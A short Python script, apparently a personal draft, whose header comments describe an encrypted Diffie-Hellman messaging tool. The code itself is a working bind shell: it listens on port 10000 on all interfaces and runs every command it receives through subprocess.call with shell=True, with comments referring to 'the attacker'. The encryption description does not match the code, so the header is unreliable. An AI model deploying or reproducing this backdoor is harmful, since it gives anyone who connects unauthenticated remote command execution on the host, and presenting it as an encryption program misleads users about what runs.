#!/usr/bin/python3

# William

# This program allows to create connections between two hosts and send encrypted data using the Diffie Hellman pki

# TO DO:
#   - make the connection using sockets and automatically implement the Diffie Hellman pki
#   - use threads to be able to open connections on multiple ports
#   - allows the clients to send encrypted data back and forth
#   - allow for encrypted file tranfers ?

# Final architecture will probably have 3 classes
#   - one for the crypto clients (identified by their private and public keys) each instance should represent one "person" wanting to talk to an other
#   - one for each end to end connection (person to person), it should handle the sending, recieving and be the link between the users and the following class
#   - one for the basic connection infrastructure (assigning ports, managing the number of connections, the roles etc...) it will probably have a stack of users and of sockets


# https://docs.python.org/3.7/howto/sockets.html
# https://docs.python.org/3.7/library/threading.html
# https://docs.python.org/2/library/multiprocessing.html
# https://stackoverflow.com/questions/33961208/how-to-send-and-receive-from-the-same-socket-in-python
# https://steelkiwi.com/blog/working-tcp-sockets/
# https://steelkiwi.com/blog/websocket-server-on-aiohttp-in-django-project/

import socket
import subprocess

# for now this program is a first draft


def receiver(host, port):
    '''
    This function implements a listener and will try to execute the commands recieved on the listener
    '''
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', port))
    # The preceding lines just create a socket that listens to connections coming from any IP address on the port
    s.listen(1)
    # It will only listen to one connection, the others will be dropped
    c, addr=s.accept()
    # whenever it receives a connection it will start the shell part.
    print("Connection from", addr)
    print("bind@shell>", end="")
    # This line is just to make the programlook nicer as if there was a real shell prompt
    data="0"
    while True: # Forever until the program reaches a break
        data=c.recv(128).decode().split(' ')
        print(' '.join(data))
        print("bind@shell>", end="")
        if len(''.join(data))==0 or ''.join(data)=="exit": # if the attacker sent an exit or nothing then exit. This will close the port etc ...
            break
        subprocess.call(data, shell=True) # execute the command received
    s.shutdown(socket.SHUT_RDWR) # after the attacker is done close the port and destroy the socket
    s.close()
    return(0)

if __name__=="__main__":
#    host=socket.gethostname()
    host=input("Type in the IP address of your listener (in real life this part would just query for example the ifconfig command to get the IP). By default the listening port will be 10000, you can change it in the code.\n")
    port=10000
    try:
        receiver(host, port)
    except:
        print("Sorry :(")
